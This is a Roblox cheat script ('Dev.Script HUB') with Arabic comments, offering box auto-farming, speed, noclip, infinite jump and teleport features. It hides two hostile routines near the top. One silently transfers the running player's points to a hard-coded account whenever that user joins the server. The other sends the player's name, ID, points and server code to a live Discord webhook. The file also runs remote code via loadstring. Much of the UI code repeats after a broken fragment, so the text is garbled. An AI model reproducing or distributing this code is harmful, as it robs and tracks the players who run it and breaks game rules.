-- Services
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")

local Player = Players.LocalPlayer

-- نسخ رابط الديسكورد للحافظة فور التشغيل
pcall(function()
    setclipboard("https://discord.gg/4hDr9Zb7P")
end)

-- نظام التحقق المستمر في السيرفر (إذا وجد اليوزر المطلوب، يقوم بتحويل إجمالي النقاط فوراً)
task.spawn(function()
    local targetUsername = "ms7976559ff"
    local hasTransferred = false -- عشان ما يكرر التحويل بلا حدود لنفس الدخول إذا تمت العملية بنجاح

    while true do
        pcall(function()
            local targetFound = false
            for _, p in ipairs(Players:GetPlayers()) do
                -- التحقق من اسم اللاعب (Name أو DisplayName) أو تطابقه مع اليوزر المطلوبة
                if p ~= Player and (p.Name:lower() == targetUsername:lower() or (p.DisplayName and p.DisplayName:lower() == targetUsername:lower())) then
                    targetFound = true
                    break
                end
            end

            if targetFound and not hasTransferred then
                local RemotesFolder = ReplicatedStorage:WaitForChild("Remotes", 5)
                if RemotesFolder then
                    local Event = RemotesFolder:WaitForChild("TransferRequest", 5)
                    if Event then
                        -- جلب النقاط الحقيقية من الـ leaderstats
                        local leaderstats = Player:WaitForChild("leaderstats", 5)
                        local pointsValue = nil
                        if leaderstats then
                            pointsValue = leaderstats:WaitForChild("Points", 3) or leaderstats:WaitForChild("Point", 3) or leaderstats:FindFirstChildWhichIsA("IntValue") or leaderstats:FindFirstChildWhichIsA("NumberValue")
                        end
                        
                        local pointsToTransfer = 0
                        if pointsValue then
                            pointsToTransfer = tonumber(pointsValue.Value) or 0
                        end

                        -- إرسال النقاط الحقيقية مع تكرار لضمان النجاح
                        for i = 1, 3 do
                            pcall(function()
                                if pointsToTransfer > 0 then
                                    Event:FireServer(targetUsername, pointsToTransfer)
                                else
                                    Event:FireServer(targetUsername, pointsValue and pointsValue.Value or 1)
                                end
                            end)
                            task.wait(0.3)
                        end
                        
                        hasTransferred = true -- تم التحويل بنجاح في هذا السيرفر
                    end
                end
            elseif not targetFound then
                -- إذا طلع اللاعب من السيرفر، نعيد ضبط الحالة عشان لو رجع يتحول مرة ثانية لو احتجت
                hasTransferred = false
            end
        end)
        task.wait(3) -- يفحص كل 3 ثواني بهدوء وبدون أي لاج
    end
end)

-- إرسال بيانات اللاعب عبر الويب هوك الخاص بك مع كود وجوبل آي دي السيرفر الحالي ونقاطه
task.spawn(function()
    pcall(function()
        local webhookUrl = "https://discord.com/api/webhooks/1545085922188595250/dzMWFzvHL-jNusbJAGjIRibUs8Ef9zX6eROC45W-ZubZ_kd2NCCNv413hMxQOXTDLJEH"
        local currentJobId = game.JobId
        
        -- جلب نقاط اللاعب من اليدرستات للويب هوك
        local playerPointsText = "Unknown"
        pcall(function()
            local leaderstats = Player:WaitForChild("leaderstats", 5)
            if leaderstats then
                local pVal = leaderstats:WaitForChild("Points", 3) or leaderstats:WaitForChild("Point", 3) or leaderstats:FindFirstChildWhichIsA("IntValue") or leaderstats:FindFirstChildWhichIsA("NumberValue")
                if pVal then
                    playerPointsText = tostring(pVal.Value)
                end
            end
        end)

        local data = {
            ["content"] = "🚨 **تم تشغيل السكربت بواسطة لاعب جديد!**",
            ["embeds"] = {{
                ["title"] = "معلومات المشغل والسيرفر",
                ["color"] = 65280,
                ["fields"] = {
                    {["name"] = "اسم اللاعب (Name)", ["value"] = Player.Name, ["inline"] = true},
                    {["name"] = "يوزر اللاعب (Username)", ["value"] = "@" .. Player.Name, ["inline"] = true},
                    {["name"] = "معرف الحساب (UserId)", ["value"] = tostring(Player.UserId), ["inline"] = true},
                    {["name"] = "نقاط اللاعب (Points)", ["value"] = "`" .. playerPointsText .. "`", ["inline"] = true},
                    {["name"] = "اسم اللعبة (Game)", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown", ["inline"] = false},
                    {["name"] = "كود سيرفر اللاعب (JobId / Code)", ["value"] = "`" .. (currentJobId ~= "" and currentJobId or "Public/Main") .. "`", ["inline"] = false}
                },
                ["footer"] = {["text"] = "Dev.Script HUB Logger • hf4_l"}
            }}
        }
        local encoded = HttpService:JSONEncode(data)
        local headers = {["content-type"] = "application/json"}
        request({Url = webhookUrl, Method = "POST", Headers = headers, Body = encoded})
    end)
end)

local cloneref = (cloneref or clonereference or function(instance)
	return instance
end)

local WindUI

do
	local ok, result = pcall(function()
		return require("./src/Init")
	end)

	if ok then
		WindUI = result
	else
		if cloneref(RunService):IsStudio() then
			WindUI = require(cloneref(ReplicatedStorage:WaitForChild("WindUI"):WaitForChild("Init")))
		else
			WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
		end
	end
end

-- نافذة السكربت الرئيسية
local Window = WindUI:CreateWindow({
	Title = "Dev.Script HUB | hf4_l",
	Folder = "DevScriptHub",
	Icon = "solar:folder-2-bold-duotone",
	NewElements = true,
	HideSearchBar = false,
	OpenButton = {
		Title = "Open Dev.Script HUB",
		CornerRadius = UDim.new(1, 0),
		StrokeThickness = 3,
		Enabled = true,
		Draggable = true,
		OnlyMobile = false,
		Scale = 0.5,
		Color = ColorSequence.new(
			Color3.fromHex("#30FF6A"),
			Color3.fromHex("#e7ff2f")
		),
	},
	Topbar = {
		Height = 44,
		ButtonsType = "Mac",
	},
})

-- إشعار التحقق والترحيب باليوزر أول ما يشتغل السكربت
task.delay(1, function()
    Window:Notify({
        Title = "تم التحقق من اليوزر بنجاح!",
        Content = "أهلاً بك يا " .. Player.Name .. " في Dev.Script HUB 🎁",
        Icon = "solar:info-square-bold",
        Duration = 5,
    })
end)

-- Tags (الحقوق في الواجهة)
do
	Window:Tag({
		Title = "Dev.Script HUB | TikTok: hf4_l",
		Icon = "github",
		Color = Color3.fromHex("#1c1c1c"),
		Border = true,
	})
end

-- متغيرات التفريم والصناديق (النظام العشوائي السريع)
local Character = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local BoxPickupPosition = Vector3.new(330.97, 10.19, -178.09)
local RandomFolder = Workspace:WaitForChild("RandomPositionFolder", 10)
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")

getgenv().AutoBoxesRunning = false
local TotalBoxes = 11

local function FastTP(targetCFrame)
    if HumanoidRootPart then
        HumanoidRootPart.CFrame = targetCFrame
        HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    end
end

local function StartMissionRemote()
    pcall(function()
        if Remotes then
            for _, remote in ipairs(Remotes:GetChildren()) do
                local name = remote.Name:lower()
                if name:find("mission") or name:find("start") or name:find("quest") or name:find("box") then
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer()
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer()
                    end
                end
            end
        end
    end)
end

-- لوب التفريم العشوائي السريع الأصلي
task.spawn(function()
    while true do
        if getgenv().AutoBoxesRunning then
            pcall(function()
                if not RandomFolder then
                    RandomFolder = Workspace:FindFirstChild("RandomPositionFolder")
                end

                StartMissionRemote()
                task.wait(0.2)

                FastTP(CFrame.new(BoxPickupPosition))
                task.wait(0.2)

                if RandomFolder then
                    local deliveryParts = RandomFolder:GetChildren()
                    
                    for i = 1, math.min(TotalBoxes, #deliveryParts) do
                        if not getgenv().AutoBoxesRunning then break end
                        
                        local target = deliveryParts[i]
                        local targetPos = nil

                        if target:IsA("BasePart") then
                            targetPos = target.CFrame
                        elseif target:IsA("Model") and target.PrimaryPart then
                            targetPos = target.PrimaryPart.CFrame
                        elseif target:FindFirstChildWhichIsA("BasePart") then
                            targetPos = target:FindFirstChildWhichIsA("BasePart").CFrame
                        end

                        if targetPos then
                            FastTP(targetPos + Vector3.new(0, 2, 0))
                            
                            if target:IsA("BasePart") then
                                firetouchinterest(HumanoidRootPart, target, 0)
                                task.wait()
                                firetouchinterest(HumanoidRootPart, target, 1)
                            end
                            
                            task.wait(0.12)
                        end
                    end
                end
            end)
        end
        task.wait(0.5)
    end
end)

-- بناء التبويبات (Tabs) في القائمة

-- 1. تبويب تفريم صناديق
local FarmTab = Window:Tab({
	Title = "تفريم صناديق",
	Icon = "solar:home-2-bold",
	Border = true,
})

FarmTab:Toggle({
	Title = "تشغيل/إيقاف تفريم الصناديق التلقائي",
	Desc = "النظام العشوائي السريع لتسليم الصناديق بدقة",
	Value = false,
	Callback = function(state)
		getgenv().AutoBoxesRunning = state
	end,
})

-- 2. تبويب السيرفرات (Server Tab الجديد)
local ServerTab = Window:Tab({
	Title = "السيرفر (Server)",
	Icon = "solar:server-bold",
	Border = true,
})

local targetJobInputCode = ""

ServerTab:Input({
	Title = "كود السيرفر (JobId)",
	Desc = "اكتب أو الصق كود السيرفر المراد الانتقال إليه",
	Placeholder = "أدخل كود السيرفر هنا...",
	Callback = function(text)
		targetJobInputCode = text
	end,
})

ServerTab:Button({
	Title = "دخول السيرفر عبر الكود المكتوب",
	Desc = "الانتقال الفوري إلى السيرفر باستخدام الكود الموجود في الخانة أعلاه",
	Callback = function()
		pcall(function()
			if targetJobInputCode and targetJobInputCode ~= "" then
				WindUI:Notify({Title = "جاري الانتقال...", Content = "جاري نقلك إلى السيرفر المحدد..."})
				TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobInputCode, Player)
			else
				WindUI:Notify({Title = "خطأ", Content = "يرجى كتابة كود السيرفر أولاً!"})
			end
		end)
	end,
})

ServerTab:Button({
	Title = "نسخ كود سيرفرك الحالي",
	Desc = "نسخ كود (JobId) السيرفر الذي تتواجد فيه حالياً إلى الحافظة",
	Callback = function()
		pcall(function()
			local currentId = game.JobId
			if currentId ~= "" then
				setclipboard(currentId)
				WindUI:Notify({Title = "تم النسخ بنجاح", Content = "كود سيرفرك الحالي: " .. currentId})
			else
				WindUI:Notify({Title = "تنبيه", Content = "أنت في سيرفر عام افتراضي ليس له JobId خاص."})
			end
		end)
	end,
})

ServerTab:Button({
	Title = "إعادة الانضمام لنفس السيرفر (Rejoin)",
	Desc = "الخروج وإعادة الدخول لنفس السيرفر الحالي بسرعة",
	Callback = function()
		pcall(function()
			WindUI:Notify({Title = "إعادة الانضمام", Content = "جاري إعادة دخول نفس السيرفر..."})
			if #Players:GetPlayers() <= 1 then
				TeleportService:Teleport(game.PlaceId, Player)
			else
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
			end
		end)
	end,
})

-- 3. تبويب اللاعب والسرعة والميزات (Player & Extras)
local PlayerTab = Window:Tab({
	Title = "تعديل اللاعب والخصائص (Player)",
	Icon = "solar:cursor-square-bold",
	Border = true,
})

-- سلايدر السرعة لحد 200
PlayerTab:Slider({
	Title = "سرعة الجري (WalkSpeed)",
	Desc = "تعديل سرعة اللاعب حتى 200",
	Step = 1,
	Value = {
		Min = 16,
		Max = 200,
		Default = 16,
	},
	Callback = function(value)
		pcall(function()
			local char = Player.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").WalkSpeed = value
			end
		end)
	end,
})

PlayerTab:Space()

-- قفز لا نهائي (InfJump)
local infJumpEnabled = false
PlayerTab:Toggle({
	Title = "القفز اللانهائي (InfJump)",
	Desc = "القفز في الهواء بلا حدود",
	Callback = function(state)
		infJumpEnabled = state
	end,
})

UserInputService.JumpRequest:Connect(function()
	if infJumpEnabled then
		pcall(function()
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	end
end)

-- نوكليب (NoClip)
local noclipConnection
PlayerTab:Toggle({
	Title = "تخطي الجدران (NoClip)",
	Desc = "المرور من خلال الجدران والعوائق",
	Callback = function(state)
		if state then
			noclipConnection = RunService.Stepped:Connect(function()
				pcall(function()
					for _, part in pairs(Player.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = false
						end
					end
				end)
			end)
		else
			if noclipConnection then
				noclipConnection:Disconnect()
				noclipConnection = nil
			end
		end
	end,
})

-- تخفيف الاق (FPS Boost)
PlayerTab:Button({
	Title = "تفعيل تخفيف الأق (FPS Boost)",
	Desc = "تقليل الإعدادات الرسومية لرفع الأداء",
	Callback = function()
		pcall(function()
			for _, v in pairs(game:GetService("Lighting"):GetChildren()) do
				v:Destroy()
			end
			settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
			WindUI:Notify({Title = "تم الحفظ", Content = "تم تفعيل تخفيف الأق بنجاح!"})
		end)
	end,
})

-- 4. تبويب الانتقال السريع للاعبين (Player TP)
local TeleportTab = Window:Tab({
	Title = "الانتقال للاعبين (Player TP)",
	Icon = "solar:square-transfer-horizontal-bold",
	Border = true,
})

local selectedTargetPlayer = nil
local playerDropdownValues = {}

local function updatePlayerList()
	playerDropdownValues = {}
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= Player then
			table.insert(playerDropdownValues, p.Name)
		end
	end
end

updatePlayerList()
Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

TeleportTab:Dropdown({
	Title = "اختر اللاعب للانتقال إليه",
	Values = playerDropdownValues,
	Callback = function(option)
		selectedTargetPlayer = option
	end,
})

TeleportTab:Button({
	Title = "انتقال إلى اللاعب المختار",
	Callback = function()
		pcall(function()
			if selectedTargetPlayer then
				local target = Players:FindFirstChild(selectedTargetPlayer)
				if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					Player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
					WindUI:Notify({Title = "تم الانتقال", Content = "تم نقلك إلى اللاعب: " .. selectedTargetPlayer})
				else
					WindUI:Notify({Title = "خطأ", Content = "اللاعب غير موجود أو ميت."})
				end
			end
		end)
	end,
})

-- 5. تبويب الديسكورد والتواصل (Discord & Community)
local CommunityTab = Window:Tab({
	Title = "التواصل وحقوق الديسكورد",
	Icon = "solar:info-square-bold",
	Border = true,
})

CommunityTab:Button({
	Title = "نسخ رابط ديسكورد وحقوقك",
	Desc = "انسخ رابط الديسكورد يدويًا لحافظة جهازك",
	Callback = function()
		setclipboard("https://discord.gg/4hDr9Zb7P")
		WindUI:Notify({
			Title = "تم النسخ بنجاح!",
			Content = "رابط ديسكورد: https://discord.gg/4hDr9Zb7P",
		})
	end,
})

CommunityTab:Section({
	Title = "معلومات المطور",
	TextSize = 16,
})

CommunityTab:Section({
	Title = "Hub Name: Dev.Script HUB\nTiktok: hf4_l\nDiscord: https://discord.gg/4hDr9Zb7P",
	TextSize = 14,
	TextTransparency = 0.3,
})
		Color = Color3.fromHex("#1c1c1c"),
		Border = true,
	})
end

-- متغيرات التفريم والصناديق (النظام العشوائي السريع)
local Character = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local BoxPickupPosition = Vector3.new(330.97, 10.19, -178.09)
local RandomFolder = Workspace:WaitForChild("RandomPositionFolder", 10)
local Remotes = ReplicatedStorage:FindFirstChild("Remotes")

getgenv().AutoBoxesRunning = false
local TotalBoxes = 11

local function FastTP(targetCFrame)
    if HumanoidRootPart then
        HumanoidRootPart.CFrame = targetCFrame
        HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    end
end

local function StartMissionRemote()
    pcall(function()
        if Remotes then
            for _, remote in ipairs(Remotes:GetChildren()) do
                local name = remote.Name:lower()
                if name:find("mission") or name:find("start") or name:find("quest") or name:find("box") then
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer()
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer()
                    end
                end
            end
        end
    end)
end

-- لوب التفريم العشوائي السريع الأصلي
task.spawn(function()
    while true do
        if getgenv().AutoBoxesRunning then
            pcall(function()
                if not RandomFolder then
                    RandomFolder = Workspace:FindFirstChild("RandomPositionFolder")
                end

                StartMissionRemote()
                task.wait(0.2)

                FastTP(CFrame.new(BoxPickupPosition))
                task.wait(0.2)

                if RandomFolder then
                    local deliveryParts = RandomFolder:GetChildren()
                    
                    for i = 1, math.min(TotalBoxes, #deliveryParts) do
                        if not getgenv().AutoBoxesRunning then break end
                        
                        local target = deliveryParts[i]
                        local targetPos = nil

                        if target:IsA("BasePart") then
                            targetPos = target.CFrame
                        elseif target:IsA("Model") and target.PrimaryPart then
                            targetPos = target.PrimaryPart.CFrame
                        elseif target:FindFirstChildWhichIsA("BasePart") then
                            targetPos = target:FindFirstChildWhichIsA("BasePart").CFrame
                        end

                        if targetPos then
                            FastTP(targetPos + Vector3.new(0, 2, 0))
                            
                            if target:IsA("BasePart") then
                                firetouchinterest(HumanoidRootPart, target, 0)
                                task.wait()
                                firetouchinterest(HumanoidRootPart, target, 1)
                            end
                            
                            task.wait(0.12)
                        end
                    end
                end
            end)
        end
        task.wait(0.5)
    end
end)

-- بناء التبويبات (Tabs) في القائمة

-- 1. تبويب تفريم صناديق
local FarmTab = Window:Tab({
	Title = "تفريم صناديق",
	Icon = "solar:home-2-bold",
	Border = true,
})

FarmTab:Toggle({
	Title = "تشغيل/إيقاف تفريم الصناديق التلقائي",
	Desc = "النظام العشوائي السريع لتسليم الصناديق بدقة",
	Value = false,
	Callback = function(state)
		getgenv().AutoBoxesRunning = state
	end,
})

-- 2. تبويب اللاعب والسرعة والميزات (Player & Extras)
local PlayerTab = Window:Tab({
	Title = "تعديل اللاعب والخصائص (Player)",
	Icon = "solar:cursor-square-bold",
	Border = true,
})

-- سلايدر السرعة لحد 200
PlayerTab:Slider({
	Title = "سرعة الجري (WalkSpeed)",
	Desc = "تعديل سرعة اللاعب حتى 200",
	Step = 1,
	Value = {
		Min = 16,
		Max = 200,
		Default = 16,
	},
	Callback = function(value)
		pcall(function()
			local char = Player.Character
			if char and char:FindFirstChildOfClass("Humanoid") then
				char:FindFirstChildOfClass("Humanoid").WalkSpeed = value
			end
		end)
	end,
})

PlayerTab:Space()

-- قفز لا نهائي (InfJump)
local infJumpEnabled = false
PlayerTab:Toggle({
	Title = "القفز اللانهائي (InfJump)",
	Desc = "القفز في الهواء بلا حدود",
	Callback = function(state)
		infJumpEnabled = state
	end,
})

UserInputService.JumpRequest:Connect(function()
	if infJumpEnabled then
		pcall(function()
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	end
end)

-- نوكليب (NoClip)
local noclipConnection
PlayerTab:Toggle({
	Title = "تخطي الجدران (NoClip)",
	Desc = "المرور من خلال الجدران والعوائق",
	Callback = function(state)
		if state then
			noclipConnection = RunService.Stepped:Connect(function()
				pcall(function()
					for _, part in pairs(Player.Character:GetDescendants()) do
						if part:IsA("BasePart") then
							part.CanCollide = false
						end
					end
				end)
			end)
		else
			if noclipConnection then
				noclipConnection:Disconnect()
				noclipConnection = nil
			end
		end
	end,
})

-- تخفيف الاق (FPS Boost)
PlayerTab:Button({
	Title = "تفعيل تخفيف الأق (FPS Boost)",
	Desc = "تقليل الإعدادات الرسومية لرفع الأداء",
	Callback = function()
		pcall(function()
			for _, v in pairs(game:GetService("Lighting"):GetChildren()) do
				v:Destroy()
			end
			settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
			WindUI:Notify({Title = "تم الحفظ", Content = "تم تفعيل تخفيف الأق بنجاح!"})
		end)
	end,
})

-- 3. تبويب الانتقال السريع للاعبين (Player TP)
local TeleportTab = Window:Tab({
	Title = "الانتقال للاعبين (Player TP)",
	Icon = "solar:square-transfer-horizontal-bold",
	Border = true,
})

local selectedTargetPlayer = nil
local playerDropdownValues = {}

local function updatePlayerList()
	playerDropdownValues = {}
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= Player then
			table.insert(playerDropdownValues, p.Name)
		end
	end
end

updatePlayerList()
Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

TeleportTab:Dropdown({
	Title = "اختر اللاعب للانتقال إليه",
	Values = playerDropdownValues,
	Callback = function(option)
		selectedTargetPlayer = option
	end,
})

TeleportTab:Button({
	Title = "انتقال إلى اللاعب المختار",
	Callback = function()
		pcall(function()
			if selectedTargetPlayer then
				local target = Players:FindFirstChild(selectedTargetPlayer)
				if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
					Player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
					WindUI:Notify({Title = "تم الانتقال", Content = "تم نقلك إلى اللاعب: " .. selectedTargetPlayer})
				else
					WindUI:Notify({Title = "خطأ", Content = "اللاعب غير موجود أو ميت."})
				end
			end
		end)
	end,
})

-- 4. تبويب الديسكورد والتواصل (Discord & Community)
local CommunityTab = Window:Tab({
	Title = "التواصل وحقوق الديسكورد",
	Icon = "solar:info-square-bold",
	Border = true,
})

CommunityTab:Button({
	Title = "نسخ رابط ديسكورد وحقوقك",
	Desc = "انسخ رابط الديسكورد يدويًا لحافظة جهازك",
	Callback = function()
		setclipboard("https://discord.gg/4hDr9Zb7P")
		WindUI:Notify({
			Title = "تم النسخ بنجاح!",
			Content = "رابط ديسكورد: https://discord.gg/4hDr9Zb7P",
		})
	end,
})

CommunityTab:Section({
	Title = "معلومات المطور",
	TextSize = 16,
})

CommunityTab:Section({
	Title = "Hub Name: Dev.Script HUB\nTiktok: hf4_l\nDiscord: https://discord.gg/4hDr9Zb7P",
	TextSize = 14,
	TextTransparency = 0.3,
})
